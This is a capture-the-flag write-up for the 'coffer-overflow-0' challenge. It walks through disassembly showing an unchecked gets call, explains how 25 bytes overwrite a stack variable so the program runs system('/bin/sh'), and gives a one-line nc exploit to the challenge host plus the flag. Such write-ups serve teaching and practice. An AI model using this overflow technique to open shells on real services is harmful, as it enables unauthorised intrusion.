# coffer-overflow-0

## Description

NotDeGhost

Can you fill up the coffers? We even managed to find the source for you.

## Solution

```asm
[0x00400590]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400590]> afl
0x00400590    1 42           entry0
0x004005d0    4 42   -> 37   sym.deregister_tm_clones
0x00400600    4 58   -> 55   sym.register_tm_clones
0x00400640    3 34   -> 29   sym.__do_global_dtors_aux
0x00400670    1 7            entry.init0
0x00400780    1 2            sym.__libc_csu_fini
0x00400784    1 9            sym._fini
0x00400710    4 101          sym.__libc_csu_init
0x004005c0    1 2            sym._dl_relocate_static_pie
0x00400677    3 143          main
0x00400560    1 6            sym.imp.setbuf
0x00400550    1 6            sym.imp.puts
0x00400580    1 6            sym.imp.gets
0x00400570    1 6            sym.imp.system
0x00400528    3 23           sym._init
[0x00400590]> pdf @ main
            ; DATA XREF from entry0 @ 0x4005ad
┌ 143: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x20
│           ; var uint32_t var_8h @ rbp-0x8
│           0x00400677      55             push rbp
│           0x00400678      4889e5         mov rbp, rsp
│           0x0040067b      4883ec20       sub rsp, 0x20
│           0x0040067f      48c745f80000.  mov qword [var_8h], 0
│           0x00400687      488b05d20920.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│                                                                      ; [0x601060:8]=0
│           0x0040068e      be00000000     mov esi, 0                  ; char *buf
│           0x00400693      4889c7         mov rdi, rax                ; FILE *stream
│           0x00400696      e8c5feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x0040069b      488b05ce0920.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x601070:8]=0
│           0x004006a2      be00000000     mov esi, 0                  ; char *buf
│           0x004006a7      4889c7         mov rdi, rax                ; FILE *stream
│           0x004006aa      e8b1feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x004006af      488b05ca0920.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
│                                                                      ; [0x601080:8]=0
│           0x004006b6      be00000000     mov esi, 0                  ; char *buf
│           0x004006bb      4889c7         mov rdi, rax                ; FILE *stream
│           0x004006be      e89dfeffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x004006c3      488d3dce0000.  lea rdi, str.Welcome_to_coffer_overflow__where_our_coffers_are_overfilling_with_bytes ; 0x400798 ; "Welcome to coffer overflow, where our coffers are overfilling with bytes ;)" ; const char *s
│           0x004006ca      e881feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006cf      488d3d120100.  lea rdi, str.What_do_you_want_to_fill_your_coffer_with ; 0x4007e8 ; "What do you want to fill your coffer with?" ; const char *s
│           0x004006d6      e875feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006db      488d45e0       lea rax, [s]
│           0x004006df      4889c7         mov rdi, rax                ; char *s
│           0x004006e2      e899feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004006e7      48837df800     cmp qword [var_8h], 0
│       ┌─< 0x004006ec      7411           je 0x4006ff
│       │   0x004006ee      488d3d1e0100.  lea rdi, str.bin_sh         ; 0x400813 ; "/bin/sh" ; const char *string
│       │   0x004006f5      b800000000     mov eax, 0
│       │   0x004006fa      e871feffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from main @ 0x4006ec
│       └─> 0x004006ff      b800000000     mov eax, 0
│           0x00400704      c9             leave
└           0x00400705      c3             ret
[0x00400590]>
```

Important things to note here:

 - `0x004006ee` calls `system` with the parameter `"/bin/sh"`, which spawns a shell.
 - `0x004006ec` includes instructions to jump and skip the above system call if `[var_8h]` is equal to 0 and `[var_8h]` is set to 0 at the start of the program.
 - `0x004006e2` includes an unsafe call to `gets` and sets the value of `s`.
 - `s` is placed on the stack after `[var_8h]`, allowing the call to `gets` to write to both variables.

The difference between `s` and `[var_8h]` is 0x20 - 0x8 bytes, or 24 bytes.
Therefore, writing 25 bytes is enough to alter the value of `[var_8h]`.

To prevent the program from exitting, we can use `cat` to direct `stdin` to `stdout` and pipe that to the program along with our payload.
This will allow us to type bash commands and read files such as `flag.txt` which contains our flag.

## Exploit Script

```sh
#!/bin/bash

(echo aaaaaaaaaaaaaaaaaaaaaaaaa; cat) | nc 2020.redpwnc.tf 31199
```

## Flag

```flag{b0ffer_0verf10w_3asy_as_123}```

